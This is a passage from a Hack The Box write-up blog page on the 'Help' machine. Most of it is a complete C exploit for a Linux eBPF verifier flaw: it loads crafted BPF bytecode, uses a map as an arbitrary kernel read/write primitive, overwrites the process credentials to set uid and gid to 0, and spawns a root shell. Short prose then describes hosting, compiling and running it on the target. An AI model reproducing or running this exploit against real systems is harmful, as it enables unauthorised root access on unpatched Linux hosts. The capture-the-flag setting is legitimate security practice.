#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;linux/bpf.h&gt;
#include &lt;linux/unistd.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/un.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;stdint.h&gt;
</span>
<span class="cp">#define PHYS_OFFSET 0xffff880000000000
#define CRED_OFFSET 0x5f8
#define UID_OFFSET 4
#define LOG_BUF_SIZE 65536
#define PROGSIZE 328
</span>
<span class="kt">int</span> <span class="n">sockets</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
<span class="kt">int</span> <span class="n">mapfd</span><span class="p">,</span> <span class="n">progfd</span><span class="p">;</span>

<span class="kt">char</span> <span class="o">*</span><span class="n">__prog</span> <span class="o">=</span> 	<span class="s">"</span><span class="se">\xb4\x09\x00\x00\xff\xff\xff\xff</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x55\x09\x02\x00\xff\xff\xff\xff</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xb7\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x18\x19\x00\x00\x03\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x62\x0a\xfc\xff\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x79\x06\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x62\x0a\xfc\xff\x01\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x79\x07\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x62\x0a\xfc\xff\x02\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x79\x08\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xbf\x02\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\xb7\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x55\x06\x03\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x79\x73\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x7b\x32\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x55\x06\x02\x00\x01\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x7b\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x7b\x87\x00\x00\x00\x00\x00\x00</span><span class="s">"</span>
		<span class="s">"</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">"</span><span class="p">;</span>

<span class="kt">char</span> <span class="n">bpf_log_buf</span><span class="p">[</span><span class="n">LOG_BUF_SIZE</span><span class="p">];</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_prog_load</span><span class="p">(</span><span class="k">enum</span> <span class="n">bpf_prog_type</span> <span class="n">prog_type</span><span class="p">,</span>
		  <span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="n">insns</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prog_len</span><span class="p">,</span>
		  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">license</span><span class="p">,</span> <span class="kt">int</span> <span class="n">kern_version</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
		<span class="p">.</span><span class="n">prog_type</span> <span class="o">=</span> <span class="n">prog_type</span><span class="p">,</span>
		<span class="p">.</span><span class="n">insns</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">insns</span><span class="p">,</span>
		<span class="p">.</span><span class="n">insn_cnt</span> <span class="o">=</span> <span class="n">prog_len</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span><span class="p">),</span>
		<span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">license</span><span class="p">,</span>
		<span class="p">.</span><span class="n">log_buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">bpf_log_buf</span><span class="p">,</span>
		<span class="p">.</span><span class="n">log_size</span> <span class="o">=</span> <span class="n">LOG_BUF_SIZE</span><span class="p">,</span>
		<span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
	<span class="p">};</span>

	<span class="n">attr</span><span class="p">.</span><span class="n">kern_version</span> <span class="o">=</span> <span class="n">kern_version</span><span class="p">;</span>

	<span class="n">bpf_log_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_PROG_LOAD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_create_map</span><span class="p">(</span><span class="k">enum</span> <span class="n">bpf_map_type</span> <span class="n">map_type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">key_size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">value_size</span><span class="p">,</span>
		   <span class="kt">int</span> <span class="n">max_entries</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
		<span class="p">.</span><span class="n">map_type</span> <span class="o">=</span> <span class="n">map_type</span><span class="p">,</span>
		<span class="p">.</span><span class="n">key_size</span> <span class="o">=</span> <span class="n">key_size</span><span class="p">,</span>
		<span class="p">.</span><span class="n">value_size</span> <span class="o">=</span> <span class="n">value_size</span><span class="p">,</span>
		<span class="p">.</span><span class="n">max_entries</span> <span class="o">=</span> <span class="n">max_entries</span>
	<span class="p">};</span>

	<span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_CREATE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_update_elem</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">key</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
		<span class="p">.</span><span class="n">map_fd</span> <span class="o">=</span> <span class="n">mapfd</span><span class="p">,</span>
		<span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span>
		<span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">value</span><span class="p">,</span>
		<span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
	<span class="p">};</span>

	<span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_UPDATE_ELEM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_lookup_elem</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
		<span class="p">.</span><span class="n">map_fd</span> <span class="o">=</span> <span class="n">mapfd</span><span class="p">,</span>
		<span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">key</span><span class="p">,</span>
		<span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">value</span><span class="p">,</span>
	<span class="p">};</span>

	<span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_LOOKUP_ELEM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">__exit</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"error: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
	<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">prep</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">mapfd</span> <span class="o">=</span> <span class="n">bpf_create_map</span><span class="p">(</span><span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">),</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="p">),</span> <span class="mi">3</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">mapfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

	<span class="n">progfd</span> <span class="o">=</span> <span class="n">bpf_prog_load</span><span class="p">(</span><span class="n">BPF_PROG_TYPE_SOCKET_FILTER</span><span class="p">,</span>
			<span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="p">)</span><span class="n">__prog</span><span class="p">,</span> <span class="n">PROGSIZE</span><span class="p">,</span> <span class="s">"GPL"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">progfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

	<span class="k">if</span><span class="p">(</span><span class="n">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sockets</span><span class="p">))</span>
		<span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

	<span class="k">if</span><span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_ATTACH_BPF</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">progfd</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">progfd</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">writemsg</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

	<span class="kt">ssize_t</span> <span class="n">n</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"write"</span><span class="p">);</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"short write: %lu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">#define __update_elem(a, b, c) \
	bpf_update_elem(0, (a)); \
	bpf_update_elem(1, (b)); \
	bpf_update_elem(2, (c)); \
	writemsg();
</span>
<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">get_value</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">uint64_t</span> <span class="n">value</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">bpf_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">))</span>
		<span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>

	<span class="k">return</span> <span class="n">value</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">__get_fp</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">__update_elem</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

	<span class="k">return</span> <span class="n">get_value</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">__read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">__update_elem</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

	<span class="k">return</span> <span class="n">get_value</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">__write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">__update_elem</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">get_sp</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">return</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x4000</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">uint64_t</span> <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">,</span> <span class="n">credptr</span><span class="p">,</span> <span class="n">uidptr</span><span class="p">;</span>

	<span class="n">fp</span> <span class="o">=</span> <span class="n">__get_fp</span><span class="p">();</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="s">"bogus fp"</span><span class="p">);</span>
	
	<span class="n">sp</span> <span class="o">=</span> <span class="n">get_sp</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">sp</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="s">"bogus sp"</span><span class="p">);</span>
	
	<span class="n">task_struct</span> <span class="o">=</span> <span class="n">__read</span><span class="p">(</span><span class="n">sp</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">task_struct</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="s">"bogus task ptr"</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"task_struct = %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">);</span>

	<span class="n">credptr</span> <span class="o">=</span> <span class="n">__read</span><span class="p">(</span><span class="n">task_struct</span> <span class="o">+</span> <span class="n">CRED_OFFSET</span><span class="p">);</span> <span class="c1">// cred
</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">credptr</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="s">"bogus cred ptr"</span><span class="p">);</span>

	<span class="n">uidptr</span> <span class="o">=</span> <span class="n">credptr</span> <span class="o">+</span> <span class="n">UID_OFFSET</span><span class="p">;</span> <span class="c1">// uid
</span>	<span class="k">if</span> <span class="p">(</span><span class="n">uidptr</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
		<span class="n">__exit</span><span class="p">(</span><span class="s">"bogus uid ptr"</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"uidptr = %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">uidptr</span><span class="p">);</span>
	<span class="n">__write</span><span class="p">(</span><span class="n">uidptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// set both uid and gid to 0
</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"spawning root shell</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="n">__exit</span><span class="p">(</span><span class="s">"not vulnerable?"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">prep</span><span class="p">();</span>
	<span class="n">pwn</span><span class="p">();</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p><br> I ran a python server to host the exploit then I downloaded it on the box :
<br><img src="/images/hackthebox/help/24.png" alt=""><br>
<br> Then I compiled the exploit and ran it :
<br><code class="highlighter-rouge">gcc -o exploit exploit.c</code>
<br><img src="/images/hackthebox/help/25.png" alt=""><br>
<br> And we owned root !
<br> That’s it , Feedback is appreciated !
<br> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br> Thanks for reading.
<br>
<br>
<br> Previous Hack The Box write-up : <a href="/hack-the-box/sizzle/">Hack The Box - Sizzle</a>
<br> Next Hack The Box write-up : <a href="/hack-the-box/flujab/">Hack The Box - FluJab</a></p>
<hr>


</div>





<div class="related">
  <h2>other posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/hack-the-box/chainsaw/">
            Hack The Box - Chainsaw
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/ctfs/egctf-qual/">
            EGCTF 2019 - Qualification Round
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/networked/">
            Hack The Box - Networked
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>All Tags</h2>
  <div class="tag-cloud">
<a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-2">binary-exploitation</a> <a href="/tag/blockchain/" class="set-1">blockchain</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-1">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/elasticsearch/" class="set-1">elasticsearch</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/git/" class="set-1">git</a> <a href="/tag/javascript/" class="set-1">javascript</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/js/" class="set-1">js</a> <a href="/tag/kibana/" class="set-1">kibana</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/logstash/" class="set-1">logstash</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smart-contracts/" class="set-1">smart-contracts</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/solidity/" class="set-1">solidity</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/sudo/" class="set-1">sudo</a> <a href="/tag/suid/" class="set-1">suid</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-2">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/wordpress/" class="set-1">wordpress</a>
</div>
  



      </div>
    </main><footer class="site-footer">
	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
  <div class="wrapper">
<div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked>
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
if (localStorage.getItem("theme") === null) {
    window.localStorage.setItem('theme', 'dark');
}
const theme = localStorage.getItem('theme');
if (theme === "dark") {
	document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

if (theme === "dark") {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
} else if (theme === "light") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
} else if  (userPrefers === "dark") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'dark');
	document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	window.localStorage.setItem('theme', 'dark');
	document.getElementById("theme-toggle").className = 'light';
} else {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'light');
	document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	window.localStorage.setItem('theme', 'light');
	document.getElementById("theme-toggle").className = 'dark';
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    document.documentElement.setAttribute('data-theme', 'light');
		document.documentElement.classList.add('theme--light');
        document.documentElement.classList.remove('theme--dark');
		window.localStorage.setItem('theme', 'light');
	    document.getElementById("theme-toggle").className = 'dark';
	} else {
	    document.documentElement.setAttribute('data-theme', 'dark');
		document.documentElement.classList.add('theme--dark');
        document.documentElement.classList.remove('theme--light');
		window.localStorage.setItem('theme', 'dark');
	    document.getElementById("theme-toggle").className = 'light';
	}
}
</script>
</div>
  
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
